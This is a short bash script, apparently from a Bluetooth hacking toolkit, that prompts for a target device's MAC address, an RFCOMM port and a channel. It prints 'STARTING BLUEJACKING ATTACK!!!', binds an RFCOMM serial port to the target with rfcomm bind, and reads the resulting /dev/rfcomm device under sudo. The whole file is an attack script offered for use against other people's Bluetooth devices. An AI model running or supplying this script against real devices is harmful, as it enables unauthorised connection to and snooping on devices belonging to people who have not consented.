#!/bin/bash

green="\033[32;1m"
yellow="\033[33;1m"
red="\033[31;1m"
purple="\033[37;1m"
cyan="\033[36;1m"
blue="\033[34;1m"
 term=xterm
 chill=1.5

echo ""
echo $purple "╭─"$green"Put the MAC address Target:  "$purple
                           read -p " ╰─$ " BRC
echo ""
echo $purple "╭─"$green"Put RFCOMM serial port Nº:  "$purple
                           read -p " ╰─$ " port
echo ""
echo $purple "╭─"$green"Put L2CAP channel Nº to connect RFCOMM port:  "$purple
                           read -p " ╰─$ " channel

echo ""
echo $yellow
echo "----------------------------------------------------------------------------" 
echo $red "STARTING BLUEJACKING ATTACK!!!" $yellow
echo "----------------------------------------------------------------------------" 
echo ""
sleep $chill
echo "crafting RFCOMM virtual serial port pairing >> to target device..."
rfcomm bind $port $BRC $channel
sleep $chill
echo ""
echo "showing results..."
echo ""
sleep $chill
ls -l /dev | grep rfcomm
sleep $chill
sudo $term -e cat /dev/rfcomm$port


